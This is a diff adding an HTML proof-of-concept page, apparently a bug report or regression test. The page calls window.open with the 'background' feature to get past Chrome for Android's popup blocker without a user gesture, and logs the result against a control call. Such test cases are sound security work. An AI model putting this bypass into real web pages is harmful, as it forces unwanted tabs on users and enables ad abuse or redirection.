@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head><title>Popup blocker bypass (Android)</title></head>
+<body>
+<h3>Popup blocker bypass via window.open 'background' feature</h3>
+<pre id="log"></pre>
+<script>
+function log(s) {
+  document.getElementById('log').textContent += s + '\n';
+  console.log(s);
+}
+
+log('navigator.userActivation.isActive = ' + navigator.userActivation.isActive);
+log('navigator.userActivation.hasBeenActive = ' + navigator.userActivation.hasBeenActive);
+log('Calling window.open WITHOUT user gesture, with features="background"...');
+
+// No user gesture. Blink parses 'background' unconditionally
+// (third_party/blink/renderer/core/page/create_window.cc) and the renderer maps
+// it to WindowContainerType::BACKGROUND. On Chrome for Android,
+// ChromeContentBrowserClient::CanCreateWindow returns true for BACKGROUND
+// without ever consulting the popup blocker.
+var w = window.open('popup.html', '_blank', 'background');
+
+if (w) {
+  log('RESULT: window.open returned a Window object -> popup blocker BYPASSED');
+  log('A new tab to popup.html has been created without any user gesture.');
+} else {
+  log('RESULT: window.open returned null -> popup was blocked (expected on desktop / patched builds)');
+}
+
+// Control: same call without 'background' should be blocked everywhere.
+var ctrl = window.open('popup.html', '_blank');
+log('Control (no "background" feature): ' + (ctrl ? 'NOT blocked (unexpected)' : 'blocked (expected)'));
+</script>
+</body>
+</html>
